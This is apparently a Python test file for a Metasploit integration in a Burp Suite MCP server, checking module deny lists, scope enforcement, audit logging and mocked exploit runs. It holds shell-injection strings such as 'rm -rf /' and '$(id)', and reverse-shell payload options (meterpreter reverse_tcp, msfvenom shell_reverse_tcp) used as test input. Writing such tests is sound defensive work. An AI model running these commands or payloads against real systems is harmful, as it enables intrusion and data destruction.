"""W23-b — Metasploit Framework integration tests."""

from __future__ import annotations

import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import AsyncMock, patch

from burpsuite_mcp.tools.exploit.metasploit import (
    _MSF_HARD_DENY,
    _format_set_commands,
    _module_denied,
    _parse_check_output,
    _parse_search_output,
)


def _stub_mcp():
    captured: dict = {}

    class _Stub:
        def tool(self, *a, **kw):
            def deco(fn):
                captured[fn.__name__] = fn
                return fn
            return deco

    return _Stub(), captured


class DenylistTest(unittest.TestCase):

    def test_dos_module_denied(self):
        reason = _module_denied("auxiliary/dos/http/apache_range_dos")
        self.assertNotEqual(reason, "")
        self.assertIn("hard-deny", reason)

    def test_persistence_module_denied(self):
        reason = _module_denied("post/windows/manage/persistence_exe")
        self.assertNotEqual(reason, "")

    def test_miner_module_denied(self):
        reason = _module_denied("exploit/multi/http/cve_xxxx_miner_loader")
        self.assertNotEqual(reason, "")

    def test_wiper_admin_denied(self):
        reason = _module_denied("auxiliary/admin/foo/wipe_logs")
        self.assertNotEqual(reason, "")

    def test_legit_exploit_passes(self):
        self.assertEqual(_module_denied("exploit/multi/http/struts2_content_type_ognl"), "")
        self.assertEqual(_module_denied("exploit/multi/http/log4shell_header_injection"), "")
        self.assertEqual(_module_denied("auxiliary/scanner/http/title"), "")


class SetCommandFormatTest(unittest.TestCase):

    def test_basic_options_formatted(self):
        out = _format_set_commands({"RHOSTS": "10.0.0.1", "RPORT": 80})
        self.assertIn("set RHOSTS 10.0.0.1", out)
        self.assertIn("set RPORT 80", out)

    def test_empty_values_skipped(self):
        out = _format_set_commands({"RHOSTS": "10.0.0.1", "EMPTY": "", "NONE": None})
        self.assertIn("RHOSTS", out)
        self.assertNotIn("EMPTY", out)
        self.assertNotIn("NONE", out)

    def test_shell_meta_in_value_raises(self):
        for bad in ("foo; rm -rf /", "$(id)", "`whoami`", "x|y"):
            with self.assertRaises(ValueError):
                _format_set_commands({"RHOSTS": bad})


class SearchOutputParserTest(unittest.TestCase):

    def test_parses_table(self):
        sample = (
            "Matching Modules\n"
            "================\n\n"
            "   #  Name                                         Disclosure Date  Rank       Check  Description\n"
            "   -  ----                                         ---------------  ----       -----  -----------\n"
            "   0  exploit/multi/http/struts2_content_type_ognl 2017-03-07       excellent  Yes    Apache Struts Jakarta\n"
            "   1  exploit/linux/http/apache_couchdb_cmd_exec   2017-04-06       good       Yes    Apache CouchDB Arbitrary\n"
            "\n"
            "Interact with a module by name or index.\n"
        )
        rows = _parse_search_output(sample)
        self.assertEqual(len(rows), 2)
        self.assertEqual(rows[0]["name"], "exploit/multi/http/struts2_content_type_ognl")
        self.assertEqual(rows[0]["rank"], "excellent")
        self.assertEqual(rows[0]["check_action"], "Yes")
        self.assertEqual(rows[1]["name"], "exploit/linux/http/apache_couchdb_cmd_exec")


class CheckOutputParserTest(unittest.TestCase):

    def test_vulnerable(self):
        out = "[*] Sending request\n[+] The target is vulnerable.\n"
        self.assertEqual(_parse_check_output(out), "VULNERABLE")

    def test_not_vulnerable(self):
        out = "[*] Trying target\n[-] The target is not vulnerable.\n"
        self.assertEqual(_parse_check_output(out), "NOT_VULNERABLE")

    def test_detected(self):
        out = "[*] The target appears to be running Apache 2.4.49.\n"
        self.assertEqual(_parse_check_output(out), "DETECTED")

    def test_unknown(self):
        out = "[*] Some unparseable output\n"
        self.assertEqual(_parse_check_output(out), "UNKNOWN")


class MsfSearchToolTest(unittest.IsolatedAsyncioTestCase):

    async def test_missing_msfconsole(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=False):
            out = await captured["msf_search"](query="log4shell")
        self.assertIn("error", out)
        self.assertIn("not installed", out["error"])

    async def test_cve_query_rewritten(self):
        """CVE-XXXX-YYYY -> cve:XXXX-YYYY for MSF search syntax."""
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)

        cmds_seen: list[str] = []

        async def fake_msfconsole(cmds, timeout):
            cmds_seen.append(cmds)
            return ("Matching Modules\n================\n\n", "", 0)

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._msfconsole",
                   side_effect=fake_msfconsole):
            await captured["msf_search"](query="CVE-2021-44228")
        self.assertTrue(any("cve:2021-44228" in c for c in cmds_seen))


class MsfCheckToolTest(unittest.IsolatedAsyncioTestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="praetor-msf-"))
        self.prev = Path.cwd()
        os.chdir(self.tmp)

    def tearDown(self):
        os.chdir(self.prev)
        shutil.rmtree(self.tmp, ignore_errors=True)

    async def test_denylist_refuses_dos_module(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True):
            out = await captured["msf_check"](
                module="auxiliary/dos/http/apache_range_dos",
                options={"RHOSTS": "10.0.0.1"},
            )
        self.assertEqual(out["error"], "denied_by_policy")
        self.assertIn("hard-deny", out["reason"])

    async def test_vulnerable_verdict(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)

        async def fake_msfconsole(cmds, timeout):
            return ("[+] The target is vulnerable.\n", "", 0)

        async def fake_check_scope(url):
            return {"in_scope": True, "url": url}

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._msfconsole",
                   side_effect=fake_msfconsole), \
             patch("burpsuite_mcp.tools.exploit.metasploit.check_scope",
                   new=fake_check_scope):
            out = await captured["msf_check"](
                module="exploit/multi/http/log4shell_header_injection",
                options={"RHOSTS": "https://target.example/"},
            )
        self.assertEqual(out["verdict"], "VULNERABLE")
        self.assertIn("https://target.example/", out["in_scope"])
        # Audit log line should exist.
        audit = self.tmp / ".burp-intel" / "_audit.log"
        self.assertTrue(audit.exists())
        lines = audit.read_text().strip().splitlines()
        rec = json.loads(lines[-1])
        self.assertEqual(rec["kind"], "msf_check_fired")
        self.assertEqual(rec["verdict"], "VULNERABLE")
        self.assertEqual(rec["transport"], "msf-direct")

    async def test_out_of_scope_logged(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)

        async def fake_msfconsole(cmds, timeout):
            return ("[*] checking\n", "", 0)

        async def fake_check_scope(url):
            return {"in_scope": False, "url": url}

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._msfconsole",
                   side_effect=fake_msfconsole), \
             patch("burpsuite_mcp.tools.exploit.metasploit.check_scope",
                   new=fake_check_scope):
            out = await captured["msf_check"](
                module="auxiliary/scanner/http/title",
                options={"RHOSTS": "10.99.99.99"},
            )
        self.assertEqual(out["out_of_scope"], ["10.99.99.99"])
        audit = (self.tmp / ".burp-intel" / "_audit.log").read_text().strip().splitlines()
        out_of_scope_rec = next(json.loads(l) for l in audit if "out_of_scope" in l)
        self.assertEqual(out_of_scope_rec["kind"], "msf_check_out_of_scope")

    async def test_shell_meta_in_option_refused(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit.check_scope",
                   new=AsyncMock(return_value={"in_scope": True})):
            out = await captured["msf_check"](
                module="exploit/multi/http/x",
                options={"RHOSTS": "10.0.0.1", "URI": "/x; rm -rf /"},
            )
        self.assertIn("shell-meta", out["error"])


class MsfExploitToolTest(unittest.IsolatedAsyncioTestCase):

    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="praetor-msf-exp-"))
        self.prev = Path.cwd()
        os.chdir(self.tmp)

    def tearDown(self):
        os.chdir(self.prev)
        shutil.rmtree(self.tmp, ignore_errors=True)

    async def test_denylist_refuses(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True):
            out = await captured["msf_exploit"](
                module="post/windows/manage/persistence_exe",
                options={"SESSION": 1},
            )
        self.assertEqual(out["error"], "denied_by_policy")
        self.assertFalse(out["fired"])

    async def test_check_first_blocks_when_not_vulnerable(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)

        call_count = {"n": 0}

        async def fake_msfconsole(cmds, timeout):
            call_count["n"] += 1
            # First call is `check`, returns NOT_VULNERABLE
            if cmds.rstrip().endswith("check"):
                return ("[-] The target is not vulnerable.\n", "", 0)
            return ("[*] exploit ran\n", "", 0)

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._msfconsole",
                   side_effect=fake_msfconsole), \
             patch("burpsuite_mcp.tools.exploit.metasploit.check_scope",
                   new=AsyncMock(return_value={"in_scope": True})):
            out = await captured["msf_exploit"](
                module="exploit/multi/http/log4shell_header_injection",
                options={"RHOSTS": "10.0.0.1"},
            )
        self.assertFalse(out["fired"])
        self.assertEqual(out["check_verdict"], "NOT_VULNERABLE")
        # check ran but exploit did NOT — second msfconsole call should NOT
        # have been the exploit fire.
        self.assertEqual(call_count["n"], 1)

    async def test_session_detection(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)

        async def fake_msfconsole(cmds, timeout):
            if cmds.rstrip().endswith("check"):
                return ("[+] The target is vulnerable.\n", "", 0)
            return ("[+] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.1:55211)\n",
                    "", 0)

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._msfconsole",
                   side_effect=fake_msfconsole), \
             patch("burpsuite_mcp.tools.exploit.metasploit.check_scope",
                   new=AsyncMock(return_value={"in_scope": True})):
            out = await captured["msf_exploit"](
                module="exploit/multi/http/struts2_content_type_ognl",
                options={"RHOSTS": "10.0.0.1", "RPORT": 8080,
                         "LHOST": "10.0.0.5", "LPORT": 4444,
                         "PAYLOAD": "linux/x64/meterpreter/reverse_tcp"},
            )
        self.assertTrue(out["fired"])
        self.assertTrue(out["session_opened"])
        self.assertEqual(out["check_verdict"], "VULNERABLE")
        # Audit log captures the fire with operator_authorized + transport marker.
        audit = (self.tmp / ".burp-intel" / "_audit.log").read_text().strip().splitlines()
        fired_rec = next(json.loads(l) for l in audit
                         if json.loads(l)["kind"] == "msf_exploit_fired")
        self.assertEqual(fired_rec["transport"], "msf-direct")
        self.assertTrue(fired_rec["session_opened"])


class MsfPayloadGenTest(unittest.IsolatedAsyncioTestCase):

    async def test_destructive_payload_denied(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True):
            out = await captured["msf_payload_gen"](
                payload="linux/x64/wipe_disk",
            )
        self.assertIn("destructive", out["error"])

    async def test_msfvenom_invocation_shape(self):
        from burpsuite_mcp.tools.exploit import metasploit
        stub, captured = _stub_mcp()
        metasploit.register(stub)
        seen_cmd: list[list[str]] = []

        async def fake_run_cmd(cmd, **kw):
            seen_cmd.append(cmd)
            return ("payload-bytes-here", "", 0)

        with patch("burpsuite_mcp.tools.exploit.metasploit._check_tool",
                   return_value=True), \
             patch("burpsuite_mcp.tools.exploit.metasploit._run_cmd",
                   new=fake_run_cmd):
            out = await captured["msf_payload_gen"](
                payload="linux/x64/shell_reverse_tcp",
                options={"LHOST": "10.0.0.5", "LPORT": 4444},
                format="python",
            )
        self.assertEqual(out["format"], "python")
        self.assertEqual(out["output"], "payload-bytes-here")
        self.assertEqual(seen_cmd[0][:3], ["msfvenom", "-p", "linux/x64/shell_reverse_tcp"])
        self.assertIn("LHOST=10.0.0.5", seen_cmd[0])
        self.assertIn("LPORT=4444", seen_cmd[0])
        self.assertIn("-f", seen_cmd[0])
        self.assertIn("python", seen_cmd[0])


class ToolsRegisteredTest(unittest.TestCase):

    def test_all_msf_tools_in_server(self):
        from burpsuite_mcp import server
        tools = server.mcp._tool_manager._tools
        for n in ("msf_search", "msf_module_info", "msf_check", "msf_exploit",
                  "msf_payload_gen"):
            self.assertIn(n, tools)


if __name__ == "__main__":
    unittest.main()
